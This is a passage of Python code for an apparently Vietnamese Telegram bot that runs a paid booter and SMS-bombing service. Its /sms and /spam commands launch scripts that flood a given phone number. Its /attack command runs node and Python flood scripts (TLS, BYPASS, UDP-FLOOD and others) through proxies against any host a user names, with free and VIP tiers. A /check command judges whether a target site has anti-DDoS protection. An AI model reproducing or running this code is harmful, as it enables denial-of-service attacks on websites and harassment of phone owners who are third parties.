• /id [Lấy ID Telegram]
• /language [vi-en] Đổi Ngôn Ngữ 🇻🇳-🇺🇸
━━━━━━━━━━━━━━━━━━━
• /admin1 [Owner] 📩
• /admin2 [Admin] 📩
• /donate [ Tặng Admin Gói Mì ]
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
# Danh sách số điện thoại cấm spam
banned_numbers = ["0942353163", "0879239401", "0559140928"]
last_sms_time = 0

@bot.message_handler(commands=['sms'])
def spam(message):
    global last_sms_time
    
    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipfc')
        return

    user_id = message.from_user.id
    
    # Kiểm tra thời gian giữa hai lần sử dụng lệnh /sms
    current_time = time.time()
    if current_time - last_sms_time < 31:
        remaining_time = int(31 - (current_time - last_sms_time))
        bot.reply_to(message, f'Vui lòng chờ {remaining_time} giây trước khi sử dụng lại lệnh /sms.')
        return
    
    if len(message.text.split()) != 3:
        bot.reply_to(message, 'Vui lòng nhập đúng định dạng | Ví dụ: /sms 0987654321 10')
        return
    
    phone_number = message.text.split()[1]
    lap = message.text.split()[2]
    
    if not lap.isnumeric() or not (0 < int(lap) <= 10):
        bot.reply_to(message, 'Số lần spam không hợp lệ. Vui lòng spam trong khoảng từ 1 đến 10 lần !')
        return
    
    if phone_number in banned_numbers:
        bot.reply_to(message, 'Không thể Spam Số Của Admin Đẹp Trai ku To 20CM Khiến Các Chị Em Bantumlumm !')
        return
    
    if len(phone_number) != 10 or not phone_number.isdigit():
        bot.reply_to(message, 'Số điện thoại không hợp lệ!')
        return
    
    # Thực hiện spam số điện thoại

    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, "10"])
    processes.append(process)
    bot.reply_to(message, f'''
    ➤ User ID 👤: [ {user_id} ]
➤ Spam: [ {phone_number} ] Success 📱
➤ Lặp Lại ⚔️ : {lap} 🕰
➤ Ngày : {TimeStamp()}
➤ Plan : FREE
➤ Chúc Bạn sử dụng bot vui vẻ⚡️
    ''')
    
    # Cập nhật thời gian sử dụng lệnh /sms lần cuối
    last_sms_time = current_time




last_spam_time = 0  # Thêm biến last_spam_time để lưu thời gian sử dụng lệnh /spam lần cuối

@bot.message_handler(commands=['spam'])
def spam(message):
    global last_spam_time

    # Kiểm tra xem người gửi có phải là admin hoặc thành viên VIP không
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS and member_types.get(user_id) != 'VIP':
        bot.reply_to(message, '⚠️ Gói Vip của bạn không tồn tại hoặc đã hết hạn\nVui lòng liên hệ @minhduc3919 để mua gói VIP\nSử dụng /profile để kiểm tra Plan\nDùng Lệnh /muaplan Để Xem Giá\n\n🚫 Sử dụng lệnh /sms nếu bạn là người dùng miễn phí')
        return
    
    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipfc')
        return
    
    # Kiểm tra thời gian giữa hai lần sử dụng lệnh /spam
    current_time = time.time()
    if current_time - last_spam_time < 160:
        remaining_time = int(160 - (current_time - last_spam_time))
        bot.reply_to(message, f'Vui lòng chờ {remaining_time} giây trước khi sử dụng lại lệnh /spam')
        return
    
    if len(message.text.split()) != 3:
        bot.reply_to(message, 'Vui lòng nhập đúng định dạng | Ví dụ: /spam 0987654321 30')
        return
    
    phone_number = message.text.split()[1]
    lap = message.text.split()[2]
    
    if not lap.isnumeric() or not (0 < int(lap) <= 30):
        bot.reply_to(message, 'Số lần spam không hợp lệ. Vui lòng spam trong khoảng từ 1 đến 30 lần ')
        return
    
    if phone_number in banned_numbers:
        bot.reply_to(message, 'Không thể Spam Số Của Admin Đẹp Trai ku To 20CM Khiến Các Chị Em Bantumlumm!')
        return
    
    if len(phone_number) != 10 or not phone_number.isdigit():
        bot.reply_to(message, 'Số điện thoại không hợp lệ!')
        return
    # Thực hiện spam số điện thoại

    file_path = os.path.join(os.getcwd(), "smsvip.py")
    process = subprocess.Popen(["python", file_path, phone_number, "35"])
    processes.append(process)
    bot.reply_to(message, f'''
    ➤ User ID 👤: [ {user_id} ]
➤ Spam: [ {phone_number} ] Success 📱
➤ Lặp Lại ⚔️ : {lap} 🕰
➤ Ngày : {TimeStamp()}
➤ Plan : VIP
➤ Chúc Bạn sử dụng bot vui vẻ⚡️
    ''')
    
    # Cập nhật thời gian sử dụng lệnh /spam lần cuối
    last_spam_time = current_time

    


@bot.message_handler(commands=['avtfb'])
def get_facebook_avatar(message):
    # Kiểm tra định dạng của lệnh
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng định dạng\nExample: /avtfb [link hoặc id]')
        return
    
    # Lấy đối số từ tin nhắn
    parameter = message.text.split()[1]

    # Xác định xem có phải là ID Facebook hay là liên kết Facebook
    if parameter.isdigit():  # Nếu là ID Facebook
        facebook_url = f'https://www.facebook.com/{parameter}'
    else:  # Nếu là liên kết Facebook
        facebook_url = parameter

    # Kiểm tra xem liên kết có phải từ Facebook không
    if 'facebook.com' not in facebook_url:
        bot.reply_to(message, 'Liên kết không phải từ Facebook')
        return

    try:
        # Gửi yêu cầu GET đến trang Facebook
        response = requests.get(facebook_url)
        response.raise_for_status()

        # Sử dụng BeautifulSoup để phân tích nội dung HTML
        soup = BeautifulSoup(response.text, 'html.parser')

        # Tìm thẻ meta chứa URL ảnh đại diện
        meta_image = soup.find('meta', property='og:image')

        # Kiểm tra xem có phải là liên kết ảnh không
        if meta_image:
            avatar_url = meta_image['content']
            # Gửi ảnh về cho người dùng
            bot.send_photo(message.chat.id, avatar_url)
        else:
            bot.reply_to(message, 'Xin lỗi, không tìm thấy ảnh đại diện của người dùng.')
    except Exception as e:
        bot.reply_to(message, 'Xin lỗi, không thể lấy được ảnh đại diện của người dùng. Vui lòng thử lại sau.')







@bot.message_handler(commands=['ddos'])
def ddos(message):
    # Liên kết video
    video_link = 'https://files.catbox.moe/sfo6lq.mp4'

    # HTML nhúng video từ liên kết
    video_html = f'<a href="{video_link}">&#8205;</a>'

    # Tin nhắn hướng dẫn
    help_text = '''  
>> 𝗙𝘂𝗹𝗹 𝗠𝗲𝘁𝗵𝗼𝗱𝘀 𝗟𝗮𝘆𝗲𝗿𝟳 ⚡️
━━━━━━━━━━━━━
 • 𝗟𝗮𝘆𝗲𝗿𝟳 𝗙𝗿𝗲𝗲
━━━━━━━━━━━━━
 • BOTLAG [ Free ] 
 • HTTPS [ Free ] 
━━━━━━━━━━━━━
 • 𝗟𝗮𝘆𝗲𝗿𝟳 𝗩𝗶𝗽
━━━━━━━━━━━━━
 • DESTROY [ Vip ]  
 • TLS [ Vip ] 
 • SMURF [ Vip ] 
 • BYPASS [ Vip ] 
 • FLOODER [ Vip ] 
 • GOD [ Vip ] 
 • MIX [ Vip ] 
 • UAM [ Vip ] 
 • MARS [ Vip ] 
 • TCP [ Vip ] 
━━━━━━━━━━━━━
'''

    # Gửi tin nhắn với video và tin nhắn hướng dẫn
    bot.send_message(message.chat.id, help_text)
    bot.send_message(message.chat.id, video_html, parse_mode='HTML')



allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def perform_attack(message):
    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipfc')
        return
    
    user_id = message.from_user.id

    # Kiểm tra xem user_id có phải là admin hay không
    if user_id not in ADMIN_IDS:
        # Nếu không phải là admin, kiểm tra xem user_id có trong danh sách allowed_users không
        if user_id not in allowed_users:
            bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
            return

    # Phần còn lại của xử lý lệnh /attack ở đây...

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui lòng Sử Dụng Đúng Lệnh\nVí dụ: /attack + [Method] + [Host] + [Port]\nEx: /attack HTTPS https://example.com/ 443')
        return

    username = message.from_user.username
    
    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 300:
        remaining_time = int(300 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng Nhập Cả Port.\nVí dụ: /attack {method} {host} [Port]')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "liem.com"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'BYPASS' or method == 'SMURF' or method == 'BYPASS' or method == 'FLOODER' or method == 'GOD' or method == 'HTTPS' or method == 'MIX' or method == 'UAM' or method == 'MARS' or method == 'TCP':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                return

    # Thêm các phương thức ddos chỉ cho phép VIP ở đây
    vip_methods = ['DESTROY', 'TLS', 'SMURF', 'BYPASS', 'FLOODER', 'GOD', 'MIX', 'UAM', 'MARS', 'TCP']
    free_methods = ['HTTPS', 'BOTLAG']
    if method not in vip_methods and method not in free_methods:
        bot.reply_to(message, '>> Thành viên VIP💳 mới có thể sử dụng lệnh này !\n>> Mua Vip💳 ở /muaplan')
        return

    # Các lệnh ddos còn lại ở đây...

    # Phần xác định giá cho phương thức tấn công
    price = "VIP" if method in vip_methods else "Free"

    if method in ['TLS', 'GOD', 'MIX', 'BOTLAG', 'DESTROY', 'TCP' , 'FLOODER', 'HTTPS' , 'UAM', 'BYPASS', 'SMURF', 'UDP-FLOOD', 'TCP-FLOOD','MARS','BR','TLS-FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "90", "45", "13" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        if method == 'FLOODER':
            command = ["node", "FLOODER.js", host, "90", "41", "12" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        if method == 'UAM':
            command = ["node", "UAM.js", host, "10", "90", "proxy.txt"]
            duration = 90  if price == "VIP" else 90  
        if method == 'HTTPS':
            command = ["node", "HTTPS.js", host, "45", "40", "16" , "proxy.txt"]
            duration = 60 if price == "Free" else 120  
        elif method == 'SMURF':
            command = ["node", "SMURF.js", host, "90", "40", "35" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'TCP':
            command = ["node", "TCP.js", host, "90", "55", "7" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'MIX':
            command = ["node", "MIX.js", host, "90", "40", "12" , "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'BOTLAG':
            command = ["node", "BOTLAG.js", host, "45", "65", "25" , "proxy.txt"]
            duration = 60 if price == "Free" else 120  
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "90", "43", "12" , "proxy.txt" ]
            duration = 90 if price == "VIP" else 90  
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host,
                       "90", "60", "15", "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'BYPASS':
            command = ["node", "BYPASS.js", host,
                        "90", "42", "13", "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'MARS':
            command = ["node", "MARS.js", host,
                      "90", "41", "12", "proxy.txt"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "udp.py", host, port, "90", "64", "10"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "tcp.py", host, port, "90", "64", "10"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'BR':
            command = ["node", "BR.js", host, "90", "50", "proxy.txt", "128", "90"]
            duration = 90 if price == "VIP" else 90  
        elif method == 'TLS-FLOOD':
            command = ["node", "TLS-FLOOD.js", host, "90", "120", "50", "proxy.txt"]
            duration = 90 if price == "VIP" else 90  

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(
            target=run_attack, args=(command, duration, message))
        attack_thread.start()
        video_url = "https://files.catbox.moe/osixt0.mp4"  # Replace this with the actual video URL      
        message_text =f'\n     🚀 Successful Attack 🚀 \n\n↣ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗕𝘆 👤: @{username} \n↣ 𝗛𝗼𝘀𝘁 ⚔: {host} \n↣ 𝗠𝗲𝘁𝗵𝗼𝗱 📁: {method} \n↣ 𝗧𝗶𝗺𝗲 ⏱: [ {duration}s ]\n↣ 𝗣𝗹𝗮𝗻 💵: [ {price} ] \n↣ 𝗕𝗼𝘁 🤖: @Autospam_sms_bot \n𝗢𝘄𝗻𝗲𝗿 👑 : Nguyên Đoàn Trung\n\n'
        bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')            
        
    else:
        bot.reply_to(message, '⚠️Bạn đã nhập sai lệnh hãy Sử dụng lệnh /ddos để xem phương thức tấn công !')




@bot.message_handler(commands=['donate'])
def donate(message):
    reply_text = """
>> 𝗧𝗛𝗢̂𝗡𝗚 𝗧𝗜𝗡 𝗗𝗢𝗡𝗔𝗧𝗘 💵
- Ngân Hàng : THESIEURE.COM
- Chủ Tài Khoản : doantrungnguyen
- Họ Tên : Đ.T Nguyên
- Nội Dung : ADMIN ĐẸP TRAI VCL
- Số Tiền : 100.000.000VNĐ

- Ngân Hàng : TP BANK
- STK : 27701011966
- Chủ Tài Khoản : NGUYEN VAN TAM
- Nội Dung : ADMIN ĐZ NHẤT 
- Số Tiền : 100.000.000vnđ

⚠️𝗟𝘂̛𝘂 𝘆́ Nếu Ít Thì 𝟭𝟬.𝟬𝟬𝟬.𝟬𝟬𝟬𝗩𝗡Đ
Nhiều Thì 𝟭𝟬𝟬.𝟬𝟬𝟬.𝟬𝟬𝟬𝗩𝗡Đ Nghe Chưa
Chúng Mày Hiểu Anh Nói Gì Không🌚
"""
    bot.reply_to(message, reply_text)








@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    # Tiếp tục xử lý lệnh cpu ở đây
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này !')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác !')

@bot.message_handler(commands=['fb'])
def lqm_sms(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, '>> Vui lòng nhập Link hoặc ID FB !\n>> Nên Check Bằng ID Sẽ Chính Xác Hơn !')
        return
    
    phone_number = message.text.split()[1]

    file_path = os.path.join(os.getcwd(), "info.py")
    try:
        process = subprocess.Popen(["python", file_path, phone_number, "120"])
        reply_msg = bot.reply_to(
            message,
            f'🔎 Đang Kết Nối Đến Bot >> 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗳𝗼 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸'
        )
        # Xóa tin nhắn sau 5 giây
        time.sleep(5)
        bot.delete_message(message.chat.id, reply_msg.message_id)
    except Exception as e:
        bot.reply_to(
            message,
            '❌ Không tìm thấy thông tin, vui lòng kiểm tra lại !'
        )




@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL !')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web không phải là HTML hoặc PHP. Vui lòng thử với URL trang web chứa file HTML hoặc PHP !')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}')


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = message.from_user.id
    bot.reply_to(message, f"📄 • User ID : {user_id}")




@bot.message_handler(commands=['check'])
def check_ip(message):
    try:
        if len(message.text.split()) != 2:
            bot.reply_to(message, '>> Vui lòng nhập đúng cú pháp !\nVí dụ: /check + [link website]')
            return

        url = message.text.split()[1]
        
        # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
        if not url.startswith(("http://", "https://")):
            url = "http://" + url

        # Loại bỏ tiền tố "www" nếu có
        url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
        
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website có 1 ip có khả năng không Antiddos🔒"
        else:
            reply += "Website có nhiều hơn 1 ip khả năng Antiddos🔒 Cao.\nKhó Có Thể Tấn Công Website này."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")

#admin1
@bot.message_handler(commands=['admin1'])
def admin_info(message):
    # Thay thế các giá trị sau bằng thông tin liên hệ của bạn
    tele_url = "https://t.me/minhduc3919"
    web_url = "https://guns.lol/nguyenprofile"
    admin_message = f">> Thông tin liên hệ của 𝗢𝘄𝗻𝗲𝗿\n\nTelegram : {tele_url}\nWebsite : {web_url}"
    bot.reply_to(message, admin_message)
#admin2
@bot.message_handler(commands=['admin2'])
def admin_info(message):
    # Thay thế các giá trị sau bằng thông tin liên hệ của bạn
    fb2_box = "https://guns.lol/bongtoisadk"
    tiktok2_url = "https://www.tiktok.com/@sadboyum3107"
    youtube2_url = "https://www.youtube.com/@EDMremixTikTok"
    youtube3_url = "https://www.youtube.com/@kenhkokinang"
    web2_url = "https://fb.com/100089057461799"
    admin2_message = f">> Thông tin liên hệ của Admin2:\n\nWebsite: {fb2_box}\nTiktok : {tiktok2_url}\nFacebook: {web2_url}\nYoutube1: {youtube2_url}\nYoutube2: {youtube3_url}"
    bot.reply_to(message, admin2_message)
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại !')
        return
    
    try:
        with open("proxy1.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Phút Tự Update\nSố lượng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy1.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Không tìm thấy file proxy1.txt.")





@bot.message_handler(commands=['time'])
def show_uptime(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, ">> Chỉ ADMIN mới có thể sử dụng lệnh này !")
        return
    
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')



@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, '⚠️ Lệnh không hợp lệ, Vui lòng sử dụng lệnh /lenh để xem danh sách lệnh !')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
